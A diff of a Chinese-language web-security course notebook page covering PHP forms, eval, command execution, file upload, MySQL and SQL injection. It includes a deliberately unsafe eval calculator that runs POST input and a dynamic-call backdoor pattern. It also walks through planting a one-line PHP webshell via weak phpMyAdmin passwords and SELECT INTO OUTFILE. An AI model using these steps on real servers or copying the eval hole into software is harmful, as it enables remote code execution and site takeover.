@@ -304,7 +304,7 @@
         
           
             <h2 id="第四周"><a href="#第四周" class="headerlink" title="第四周"></a>第四周</h2><h2 id="周一"><a href="#周一" class="headerlink" title="周一"></a>周一</h2><p>PHP表单处理：<br>    超全局变量$_POST   $_GET  $_REQUEST  他们都是数组</p>
-<p>$_POST<br>    提交表单  提交方式method=”POST”   提交name=”username” value=”1”<br>    <input type="submit" name="submit"></p>
+<p>$_POST<br>    提交表单  提交方式method=”POST”   提交name=”username” value=”1”<br>    &lt;input type=”submit” name=”submit”&gt;</p>
 <pre><code>接收：
 $user=$_POST[&quot;username&quot;]
 $submit=$_POST[&quot;submit&quot;]
@@ -312,8 +312,8 @@ $submit=$_POST[&quot;submit&quot;]
 
 跳转：
 PHP跳转    header(&quot;Location: login.php&quot;);
-JS跳转 echo &apos;&lt;script&gt;location.href=&quot;install.php&quot;;&lt;/script&gt;&apos;
-</code></pre><p>$_GET:<br>    发送<br>    <a href="">登录</a></p>
+JS跳转 echo &apos;&amp;lt;script&amp;gt;location.href=&quot;install.php&quot;;&amp;lt;/script&amp;gt;&apos;
+</code></pre><p>$_GET:<br>    发送<br>    &lt;a href=””&gt;登录&lt;/a&gt;</p>
 <pre><code>接收  :
 $id=$_GET[&apos;name&apos;]
 echo $id;
@@ -360,19 +360,19 @@ $func = create_function(&apos;&apos;,&apos;代码&apos;)
 
 $_GET[&apos;a&apos;]($_GET[&apos;b&apos;]);
 </code></pre><p>课堂实验：制作一个eval计算器</p>
-<pre><code>&lt;form action=&quot;&quot; method=&quot;post&quot;&gt;
+<pre><code>&amp;lt;form action=&quot;&quot; method=&quot;post&quot;&amp;gt;
 请输入要计算的内容：
-&lt;input type=&quot;text&quot; name=&quot;eval&quot; value=&quot;Rg:1+2-3&quot;&gt;
-&lt;input type=&quot;submit&quot;&gt;
-&lt;/form&gt;
+&amp;lt;input type=&quot;text&quot; name=&quot;eval&quot; value=&quot;Rg:1+2-3&quot;&amp;gt;
+&amp;lt;input type=&quot;submit&quot;&amp;gt;
+&amp;lt;/form&amp;gt;
 
-&lt;?php
+&amp;lt;?php
 @$eval=($_POST[&apos;eval&apos;]);
 if ($eval){
     @eval(&quot;\$res=$eval;&quot;);
     echo &quot;结果是：$res&quot;;
 }
-?&gt;
+?&amp;gt;
 </code></pre><p>PHP命令执行：<br>    exec(“dir-l ~/“,$output);    //output用来反馈结果<br>    print_r（$output）;</p>
 <pre><code>system(&quot;命令&quot;)        //不需要接收
 
@@ -433,18 +433,13 @@ fclose($f);
 <p>if(isset($_SESSION[‘name’])){<br>    //判断是否存在<br>}</p>
 <p>session_destroy()    //清空session缓存</p>
 <p>跳转：<br>header(“Location: show.php”);</p>
-<script>location.href='show.php'</script>
-
-<script>location.navigate='show.php'</script>//待测
-
-<script>top.location='show.php'</script>
-
-<script>self.location='show.php'</script>
-
-<script>location.replace='show.php'</script>
-
-<h2 id=""><a href="#" class="headerlink" title=""></a><meta http-equiv="refresh" content="0;URL='show.php'"></h2><h2 id="上传文件："><a href="#上传文件：" class="headerlink" title="上传文件："></a>上传文件：</h2><p><form enctype="multipart/form-data" method="post"><br>    <input type="file" name=""><br>    <input type="submit"></form></p>
-<h2 id="-1"><a href="#-1" class="headerlink" title=""></a></h2><p>if (isset($_FILES[‘filename’])){<br>    if($_FILES[‘filename’][‘error’] == 0){<br>        echo ‘文件的名字是：’ . $_FILES[‘filename’][‘name’] . “<br>“;<br>        echo ‘类型是：’ . $_FILES[‘filename’][‘type’] . “<br>“;<br>        echo ‘大小是：’ . $_FILES[‘filename’][‘size’] . “<br>“;<br>        echo ‘临时目录是：’ . $_FILES[‘filename’][‘tmp_name’] . “<br>“;</p>
+<p>&lt;script&gt;location.href=’show.php’&lt;/script&gt;</p>
+<p>&lt;script&gt;location.navigate=’show.php’&lt;/script&gt;//待测</p>
+<p>&lt;script&gt;top.location=’show.php’&lt;/script&gt;</p>
+<p>&lt;script&gt;self.location=’show.php’&lt;/script&gt;</p>
+<p>&lt;script&gt;location.replace=’show.php’&lt;/script&gt;</p>
+<h2 id="lt-meta-http-equiv-refresh-content-0-URL-’show-php’-gt"><a href="#lt-meta-http-equiv-refresh-content-0-URL-’show-php’-gt" class="headerlink" title="&lt;meta http-equiv=refresh content=0;URL=’show.php’&gt;"></a>&lt;meta http-equiv=refresh content=0;URL=’show.php’&gt;</h2><h2 id="上传文件："><a href="#上传文件：" class="headerlink" title="上传文件："></a>上传文件：</h2><p>&lt;form enctype=”multipart/form-data” method=”post”&gt;<br>    &lt;input type=”file” name=””&gt;<br>    &lt;input type=”submit”&gt;</p>
+<h2 id="lt-form-gt"><a href="#lt-form-gt" class="headerlink" title="&lt;/form&gt;"></a>&lt;/form&gt;</h2><p>if (isset($_FILES[‘filename’])){<br>    if($_FILES[‘filename’][‘error’] == 0){<br>        echo ‘文件的名字是：’ . $_FILES[‘filename’][‘name’] . “&lt;br&gt;”;<br>        echo ‘类型是：’ . $_FILES[‘filename’][‘type’] . “&lt;br&gt;”;<br>        echo ‘大小是：’ . $_FILES[‘filename’][‘size’] . “&lt;br&gt;”;<br>        echo ‘临时目录是：’ . $_FILES[‘filename’][‘tmp_name’] . “&lt;br&gt;”;</p>
 <p>读写    //$data = file_get_contents($_FILES[‘filename’][‘tmp_name’]);<br>        //file_put_contents(‘./data/‘ . $_FILES[‘filename’][‘name’],$data);</p>
 <p>拷贝        //copy($_FILES[‘filename’][‘tmp_name’],’./data/‘ . $_FILES[‘filename’][‘name’]);</p>
 <p>一般是用剪切，而不用copy和读写<br>剪切     $ok = move_uploaded_file($_FILES[‘filename’][‘tmp_name’],’./data/‘ . $_FILES[‘filename’][‘name’]);</p>
@@ -652,7 +647,7 @@ order by 1\2\3.。。 根据第几列来排序，如果超过列数就会报错*
 <p>改字段：<br>        alter table to modify 字段名 字段类型;</p>
 <p>改表名：<br>        alter table 原表名 rename to  新表名;</p>
 <p>导入数据：</p>
-<pre><code>方法1.mysql -uroot -p 密码 &lt; 要导入的数据（注意：.sql中要自动创建数据库，如果runoob.sql中不会自动创建数据库，需要用第二种方法）
+<pre><code>方法1.mysql -uroot -p 密码 &amp;lt; 要导入的数据（注意：.sql中要自动创建数据库，如果runoob.sql中不会自动创建数据库，需要用第二种方法）
 
 方法2.登录mysql，use数据库，source 路径文件
 
@@ -672,11 +667,11 @@ step1：首先通过google hacking找到phpmyadmin网站
 step2：想办法登录进phpmyadmin，弱口令登录
 show global variables like ‘%secure_file_priv%&apos;;判断是否有权限写入文件
 
-step3：select ’&lt;?php eval($_POST[_]);?&gt;&apos; into outfile &apos;g://re2.txt&apos;； 注意些木马的路径   一般是/var/www/html/
+step3：select ’&amp;lt;?php eval($_POST[_]);?&amp;gt;&apos; into outfile &apos;g://re2.txt&apos;； 注意些木马的路径   一般是/var/www/html/
 
-方法2.在cmd中mysqldump -uroot -p test&gt;./database.sql
+方法2.在cmd中mysqldump -uroot -p test&amp;gt;./database.sql
 
-mysqldump -u用户名 -p密码  数据库名 表名 &gt;路径
+mysqldump -u用户名 -p密码  数据库名 表名 &amp;gt;路径
 </code></pre><p>注释<em>**</em>注入</p>
 <pre><code>#（%23） --  注释当前行
 /*  */      中间注释
@@ -709,7 +704,7 @@ updatexml（1，拼接参数，1）；
 <pre><code>group_concat(DISTINCT field) from table_name where conditions;
 </code></pre><p>PHP连接mysql数据库</p>
 <pre><code>方法1：使用mysqli扩展连接(面向对象)
-&lt;?php
+&amp;lt;?php
 $dbhost = &apos;localhost:3306&apos;;  // mysql服务器主机地址
 $dbuser = &apos;root&apos;;            // mysql用户名
 $dbpass = &apos;123456&apos;;          // mysql用户名密码
@@ -731,55 +726,55 @@ if(! $retval )
 {
     die(&apos;无法读取数据: &apos; . mysqli_error($conn));
 }
-echo &apos;&lt;h2&gt;菜鸟教程 mysqli_fetch_array 测试&lt;h2&gt;&apos;;
-echo &apos;&lt;table border=&quot;1&quot;&gt;&lt;tr&gt;&lt;td&gt;教程 ID&lt;/td&gt;&lt;td&gt;标题&lt;/td&gt;&lt;td&gt;作者&lt;/td&gt;&lt;td&gt;提交日期&lt;/td&gt;&lt;/tr&gt;&apos;;
+echo &apos;&amp;lt;h2&amp;gt;菜鸟教程 mysqli_fetch_array 测试&amp;lt;h2&amp;gt;&apos;;
+echo &apos;&amp;lt;table border=&quot;1&quot;&amp;gt;&amp;lt;tr&amp;gt;&amp;lt;td&amp;gt;教程 ID&amp;lt;/td&amp;gt;&amp;lt;td&amp;gt;标题&amp;lt;/td&amp;gt;&amp;lt;td&amp;gt;作者&amp;lt;/td&amp;gt;&amp;lt;td&amp;gt;提交日期&amp;lt;/td&amp;gt;&amp;lt;/tr&amp;gt;&apos;;
 while($row = mysqli_fetch_array($retval, MYSQLI_ASSOC))
 {
-    echo &quot;&lt;tr&gt;&lt;td&gt; {$row[&apos;runoob_id&apos;]}&lt;/td&gt; &quot;.
-         &quot;&lt;td&gt;{$row[&apos;runoob_title&apos;]} &lt;/td&gt; &quot;.
-         &quot;&lt;td&gt;{$row[&apos;runoob_author&apos;]} &lt;/td&gt; &quot;.
-         &quot;&lt;td&gt;{$row[&apos;submission_date&apos;]} &lt;/td&gt; &quot;.
-         &quot;&lt;/tr&gt;&quot;;
+    echo &quot;&amp;lt;tr&amp;gt;&amp;lt;td&amp;gt; {$row[&apos;runoob_id&apos;]}&amp;lt;/td&amp;gt; &quot;.
+         &quot;&amp;lt;td&amp;gt;{$row[&apos;runoob_title&apos;]} &amp;lt;/td&amp;gt; &quot;.
+         &quot;&amp;lt;td&amp;gt;{$row[&apos;runoob_author&apos;]} &amp;lt;/td&amp;gt; &quot;.
+         &quot;&amp;lt;td&amp;gt;{$row[&apos;submission_date&apos;]} &amp;lt;/td&amp;gt; &quot;.
+         &quot;&amp;lt;/tr&amp;gt;&quot;;
 }
-echo &apos;&lt;/table&gt;&apos;;
+echo &apos;&amp;lt;/table&amp;gt;&apos;;
 mysqli_close($conn);
-?&gt;
+?&amp;gt;
 
 
 或者写成m面向对象：
-        &lt;?php
+        &amp;lt;?php
 header(&quot;content-type:text/html;charset=utf-8&quot;); 
-$mysql_conf=array(&apos;host&apos;=&gt;&apos;127.0.0.1&apos;,&apos;username&apos;=&gt;&apos;root&apos;,&apos;password&apos;=&gt;&apos;root&apos;,&apos;database&apos;=&gt;&apos;test&apos;,);//定义的数组 =&gt;
+$mysql_conf=array(&apos;host&apos;=&amp;gt;&apos;127.0.0.1&apos;,&apos;username&apos;=&amp;gt;&apos;root&apos;,&apos;password&apos;=&amp;gt;&apos;root&apos;,&apos;database&apos;=&amp;gt;&apos;test&apos;,);//定义的数组 =&amp;gt;
 $mysqli=new mysqli($mysql_conf[&apos;host&apos;],$mysql_conf[&apos;username&apos;],$mysql_conf[&apos;password&apos;]);//连接数据库
 //new 对象，实例化
-if ($mysqli-&gt;connect_error) {
-    die(&quot;not connect to database server&quot;.$mysqli-&gt;connect_error);//connect_error该变量存储连接服务时的错误信息，若没有，则说明连接成功
+if ($mysqli-&amp;gt;connect_error) {
+    die(&quot;not connect to database server&quot;.$mysqli-&amp;gt;connect_error);//connect_error该变量存储连接服务时的错误信息，若没有，则说明连接成功
 }
-$mysqli-&gt;query(&quot;set names &apos;utf8&apos;&quot;);//设置编码方式
-$db=$mysqli-&gt;select_db($mysql_conf[&apos;database&apos;]);//选择数据库
+$mysqli-&amp;gt;query(&quot;set names &apos;utf8&apos;&quot;);//设置编码方式
+$db=$mysqli-&amp;gt;select_db($mysql_conf[&apos;database&apos;]);//选择数据库
 
 if (!$db) {
-    die(&apos;not connect to the db&apos;.$mysqli-&gt;error);//error变量存储连接数据库的错误信息，
+    die(&apos;not connect to the db&apos;.$mysqli-&amp;gt;error);//error变量存储连接数据库的错误信息，
 }
 
 $sql=&quot;select * from news where tid=1&quot;; //这是要执行的sql语句
 
-$conn=$mysqli-&gt;query($sql);//执行sql语句
+$conn=$mysqli-&amp;gt;query($sql);//执行sql语句
 //var_dump($conn);
 if (!$conn) {
-    die(&apos;sql is error&apos;.$mysqli-&gt;error);
+    die(&apos;sql is error&apos;.$mysqli-&amp;gt;error);
 }
 
-while ($row=$conn-&gt;fetch_array(MYSQLI_ASSOC)) {//fetch_assoc该方法将执行完sql语句的结果转换为数组
+while ($row=$conn-&amp;gt;fetch_array(MYSQLI_ASSOC)) {//fetch_assoc该方法将执行完sql语句的结果转换为数组
     //var_dump($row);
-    echo &quot;&lt;pre&gt;&quot;;
+    echo &quot;&amp;lt;pre&amp;gt;&quot;;
         //print_r($row);
         echo $row[&apos;content&apos;];
-        echo &quot;&lt;/pre&gt;&quot;;
+        echo &quot;&amp;lt;/pre&amp;gt;&quot;;
 }
 
-$conn-&gt;free();//释放执行sql语句的资源
-$mysqli-&gt;close();//释放连接数据库服务的资源
+$conn-&amp;gt;free();//释放执行sql语句的资源
+$mysqli-&amp;gt;close();//释放连接数据库服务的资源
 
 
 // mysqli_fetch_assoc(), 该函数从结果集中取得一行作为关联数组 ,返回根据从结果集取得的行生成的关联数组，如果没有更多行，则返回 false。
@@ -797,27 +792,27 @@ $result=mysqli_query($conn,$create_db_sql);
 </code></pre><hr>
 <h2 id="周五"><a href="#周五" class="headerlink" title="周五"></a>周五</h2><p>方法3：使用PDO技术（面向对象的，防止sql注入）</p>
 <pre><code>$mysql_conf=array(
-&apos;host&apos;=&gt;&apos;127.0.0.1:3306&apos;,
-&apos;db&apos;=&gt;&apos;test&apos;,
-&apos;db_user&apos;=&gt;&apos;root&apos;,
-&apos;db_pwd&apos;=&gt;&apos;123456&apos;,
+&apos;host&apos;=&amp;gt;&apos;127.0.0.1:3306&apos;,
+&apos;db&apos;=&amp;gt;&apos;test&apos;,
+&apos;db_user&apos;=&amp;gt;&apos;root&apos;,
+&apos;db_pwd&apos;=&amp;gt;&apos;123456&apos;,
 );
 //$pdo = new PDO(&quot;mysql:host=&quot;.$mysql_conf[&apos;host&apos;].&quot;;dbname=&quot;.$mysql_conf[&apos;db&apos;],&quot;db_user=&quot;.$mysql_conf[&apos;db_user&apos;],&quot;db_pwd=&quot;.$mysql_conf[&apos;db_pwd&apos;]);
 
 $pdo = new PDO(&quot;mysql:host=&quot; . $mysql_conf[&apos;host&apos;] . &quot;;dbname=&quot; . $mysql_conf[&apos;db&apos;], $mysql_conf[&apos;db_user&apos;], $mysql_conf[&apos;db_pwd&apos;]);//$dsn = &quot;mysql:dbname=test;host=127.0.0.1&quot;;
 
-$pdo-&gt;exec(&quot;set names &apos;utf8&apos;&quot;);
+$pdo-&amp;gt;exec(&quot;set names &apos;utf8&apos;&quot;);
 $sql=&quot;select * from food where id=3&quot;;
-$stmt=$pdo-&gt;prepare($sql);
-$stmt-&gt;bindValue(1,&apos;1&apos;,PDO::PARAM_STR);
-$rs=$stmt-&gt;execute();
+$stmt=$pdo-&amp;gt;prepare($sql);
+$stmt-&amp;gt;bindValue(1,&apos;1&apos;,PDO::PARAM_STR);
+$rs=$stmt-&amp;gt;execute();
 if ($rs){
-    while ($row=$stmt-&gt;fetch(PDO::FETCH_ASSOC)){
+    while ($row=$stmt-&amp;gt;fetch(PDO::FETCH_ASSOC)){
         var_dump($row);
     }
 }
 $pdo=null;
-?&gt;
+?&amp;gt;
 </code></pre>
           
         
